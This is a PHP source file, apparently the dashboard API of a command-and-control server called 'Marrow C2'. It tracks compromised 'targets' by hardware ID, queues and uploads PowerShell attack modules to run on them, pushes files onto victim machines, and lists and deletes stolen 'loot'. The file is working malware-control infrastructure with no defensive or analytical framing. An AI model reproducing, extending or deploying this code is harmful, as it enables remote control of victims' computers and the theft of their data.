<?php
// Marrow C2 - Dashboard API
header('Content-Type: application/json');

require_once __DIR__ . '/../includes/Target.php';
require_once __DIR__ . '/../includes/Task.php';

$target = new Target();
$task = new Task();

$action = $_GET['action'] ?? $_POST['action'] ?? null;

switch ($action) {
    // GET endpoints
    case 'stats':
        echo json_encode($target->getStats());
        break;

    case 'targets':
        echo json_encode($target->getAll());
        break;

    case 'target':
        echo json_encode($target->get($_GET['hwid']));
        break;

    case 'tasks':
        echo json_encode($task->getForTarget($_GET['hwid'], 100));
        break;

    case 'task':
        echo json_encode($task->get($_GET['id']));
        break;

    case 'recent':
        echo json_encode($task->getRecent(50));
        break;

    case 'modules':
        $files = glob(__DIR__ . '/../modules/*.ps1');
        $modules = [];
        foreach ($files as $f) {
            $name = basename($f, '.ps1');
            $content = file_get_contents($f);
            preg_match('/#\s*@description\s*(.+)/i', $content, $m);
            $modules[] = [
                'name' => $name,
                'file' => basename($f),
                'description' => $m[1] ?? 'No description'
            ];
        }
        echo json_encode($modules);
        break;

    case 'loot':
        $hwid = preg_replace('/[^a-zA-Z0-9\-]/', '', $_GET['hwid'] ?? '');
        $dir = __DIR__ . '/../loot/' . $hwid;
        $files = [];
        if (is_dir($dir)) {
            foreach (scandir($dir) as $f) {
                if ($f !== '.' && $f !== '..') {
                    $path = "$dir/$f";
                    $files[] = [
                        'name' => $f,
                        'size' => filesize($path),
                        'time' => filemtime($path),
                        'url' => "/loot/$hwid/$f"
                    ];
                }
            }
        }
        echo json_encode($files);
        break;

    // POST endpoints
    case 'queue':
        $id = $task->queue($_POST['hwid'], $_POST['module'], $_POST['args'] ?? '');
        echo json_encode(['status' => 'ok', 'task_id' => $id]);
        break;

    case 'delete_target':
        $target->delete($_POST['hwid']);
        echo json_encode(['status' => 'ok']);
        break;

    case 'upload_module':
        if (isset($_FILES['file']) && $_FILES['file']['error'] === 0) {
            $name = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', basename($_FILES['file']['name']));
            if (pathinfo($name, PATHINFO_EXTENSION) === 'ps1') {
                move_uploaded_file($_FILES['file']['tmp_name'], __DIR__ . '/../modules/' . $name);
                echo json_encode(['status' => 'ok']);
            } else {
                echo json_encode(['error' => 'Only .ps1 files allowed']);
            }
        }
        break;

    case 'update_target':
        $hwid = $_POST['hwid'] ?? '';
        $db = Database::getInstance();
        if (isset($_POST['nickname'])) {
            $db->execute("UPDATE targets SET nickname = ? WHERE hwid = ?", [$_POST['nickname'], $hwid]);
        }
        if (isset($_POST['notes'])) {
            $db->execute("UPDATE targets SET notes = ? WHERE hwid = ?", [$_POST['notes'], $hwid]);
        }
        echo json_encode(['status' => 'ok']);
        break;

    case 'upload':
        // Handle file upload - queue as task for agent to download
        $hwid = preg_replace('/[^a-zA-Z0-9\-]/', '', $_POST['hwid'] ?? '');
        $targetPath = $_POST['path'] ?? 'C:\\';
        if (isset($_FILES['file']) && $_FILES['file']['error'] === 0) {
            $fileName = basename($_FILES['file']['name']);
            // Store in loot/uploads temporarily
            $uploadDir = __DIR__ . '/../loot/uploads';
            if (!is_dir($uploadDir))
                mkdir($uploadDir, 0777, true);
            $savePath = "$uploadDir/$hwid-$fileName";
            move_uploaded_file($_FILES['file']['tmp_name'], $savePath);
            // Queue download task for agent
            $id = $task->queue($hwid, 'upload_file', "$savePath|$targetPath$fileName");
            echo json_encode(['status' => 'ok', 'task_id' => $id, 'message' => 'File queued for upload']);
        } else {
            echo json_encode(['error' => 'No file uploaded']);
        }
        break;

    case 'delete_loot':
        $hwid = preg_replace('/[^a-zA-Z0-9\-]/', '', $_POST['hwid'] ?? '');
        $fileName = preg_replace('/[\.\/\\\\]+/', '', $_POST['file'] ?? '');
        $path = __DIR__ . "/../loot/$hwid/$fileName";
        if (file_exists($path)) {
            unlink($path);
            echo json_encode(['status' => 'ok']);
        } else {
            echo json_encode(['error' => 'File not found']);
        }
        break;

    default:
        echo json_encode(['error' => 'Unknown action']);
}
